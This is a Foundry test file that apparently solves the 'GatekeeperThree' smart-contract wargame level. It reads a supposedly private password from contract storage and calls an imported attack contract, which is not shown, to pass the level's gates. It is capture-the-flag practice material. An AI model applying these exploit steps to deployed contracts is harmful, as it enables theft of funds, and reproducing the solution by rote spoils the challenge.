// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import "../src/GatekeeperThree/GatekeeperThree.sol";
import "../src/GatekeeperThree/GatekeeperThreeFactory.sol";
import "../src/GatekeeperThree/GatekeeperThreeHack.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract GatekeeperThreeTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testGatekeeperThree() public {
        GatekeeperThreeFactory factory = new GatekeeperThreeFactory();
        address instance = factory.createInstance(_alice);
        vm.startPrank(_alice, _alice);

        GatekeeperThreeHack hack = new GatekeeperThreeHack(payable(instance));
        GatekeeperThree(payable(instance)).createTrick();
        uint256 _password = uint256(
            vm.load(
                address(GatekeeperThree(payable(instance)).trick()),
                bytes32(uint256(2))
            )
        );

        GatekeeperThree(payable(instance)).getAllowance(_password);

        payable(payable(instance)).call{value: 1 ether}("");

        hack.attack(payable(instance));

        vm.stopPrank();

        assertTrue(
            factory.validateInstance(payable(instance), _alice),
            "invalid"
        );
    }
}
